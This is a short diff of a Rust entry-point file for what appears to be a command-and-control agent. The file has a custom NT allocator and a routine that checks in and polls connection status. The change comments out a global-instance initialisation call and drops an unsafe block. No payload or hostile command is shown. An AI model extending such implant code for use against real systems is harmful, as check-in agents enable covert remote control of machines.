@@ -15,7 +15,7 @@ use mod_ntallocator::NtAllocator;
 #[global_allocator]
 static GLOBAL: NtAllocator = NtAllocator;
 
-use init::{init_checkin_data, init_global_instance, init_protocol};
+use init::{init_checkin_data, init_protocol};
 use mod_agentcore::instance;
 
 /// Main routine that initializes the runtime and repeatedly checks the connection status.
@@ -46,9 +46,7 @@ pub fn routine() {
 
 /// Main function that initializes the global instance, checkin data, and starts the routine.
 fn main() {
-    unsafe {
-        init_global_instance(); // Initialize global instance
-        init_checkin_data(); // Initialize checkin data
-        routine(); // Start the main routine
-    }
+    // init_global_instance(); // Initialize global instance
+    init_checkin_data(); // Initialize checkin data
+    routine(); // Start the main routine
 }
